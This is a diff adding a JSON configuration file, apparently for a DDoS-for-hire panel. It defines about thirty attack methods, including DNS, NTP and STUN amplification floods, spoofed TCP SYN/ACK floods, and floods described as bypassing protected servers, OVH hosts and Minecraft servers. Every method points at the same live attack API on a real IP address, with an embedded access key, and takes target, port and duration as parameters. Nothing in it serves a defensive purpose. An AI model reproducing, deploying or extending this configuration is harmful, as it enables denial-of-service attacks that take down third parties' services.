@@ -1,0 +1,730 @@
+{
+    "dns" : {
+        "enabled":true,
+        "description":"dns Amplification flood",
+        "permissions":[],
+        "target" : {
+            "method":"dns",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "ntp" : {
+        "enabled":true,
+        "description":"ntp Amplification flood",
+        "permissions":[],
+        "target" : {
+            "method":"ntp",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "stun" : {
+        "enabled":true,
+        "description":"stun Amplification flood",
+        "permissions":[],
+        "target" : {
+            "method":"stun",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "udp-bypass" : {
+        "enabled":true,
+        "description":"udp flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"udp-bypass",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "udp-bypassv2" : {
+        "enabled":true,
+        "description":"udp flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"udp-bypassv2",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "syn" : {
+        "enabled":true,
+        "description":"spoofed tcp syn flood",
+        "permissions":[],
+        "target" : {
+            "method":"syn",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "ack" : {
+        "enabled":true,
+        "description":"spoofed tcp ack flood",
+        "permissions":[],
+        "target" : {
+            "method":"ack",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "ovh" : {
+        "enabled":true,
+        "description":"handshake flood made for bypassing ovh servers ONLY",
+        "permissions":[],
+        "target" : {
+            "method":"ovh",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "ovhv2" : {
+        "enabled":true,
+        "description":"handshake flood made for bypassing ovh servers ONLY",
+        "permissions":[],
+        "target" : {
+            "method":"ovh2",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "minecraft" : {
+        "enabled":true,
+        "description":"socket flood made for minecraft servers",
+        "permissions":[],
+        "target" : {
+            "method":"minecraft",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "udpflood" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"udpflood",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "udphex" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"udphex",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "udpplain" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"udpplain",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "synflood" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"synflood",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "tcpbypass" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"tcpbypass",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "udpbypass" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"udpbypass",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "mix" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"mix",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "udpbypassv2" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"udpbypassv2",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "tcp-overflow" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"tcp-overflow",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "tcpbypassv2" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"tcp-bypassv2",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "octovpn" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"octovpn",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "udp-bomb" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"udp-bomb",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "tcp-bomb" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"tcp-bomb",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "handshake" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"handshake",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "ultra" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"ultra",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "bypass" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"bypass",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "socket" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"socket",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    },
+    "browser" : {
+        "enabled":true,
+        "description":"socket flood made for bypassing protected servers",
+        "permissions":[],
+        "target" : {
+            "method":"browser",
+            "url":["http://45.88.90.113:22223/attack?key=PwBlGAJbuOnRK86xE7ut&method=<<$method>>&target=<<$target>>&duration=<<$duration>>&port=<<$port>>"],
+            "minimumSuccess":0,
+            "PathEncoding":true
+        },
+
+        "options" : {
+            "group" : "bypass",
+            "spinner":"attack",
+            "maxtime_override":0,
+            "enhanced_maxtime":0,
+            "default_duration":60,
+            "default_port":65535,
+            "bypass_cooldown":false,
+            "global_user_limit":1,
+            "attack_launched_branding":"attacks/attack-sent.itl",
+            "api_method":true,
+            "keyvalues" : {
+            }
+        }
+    }
+}
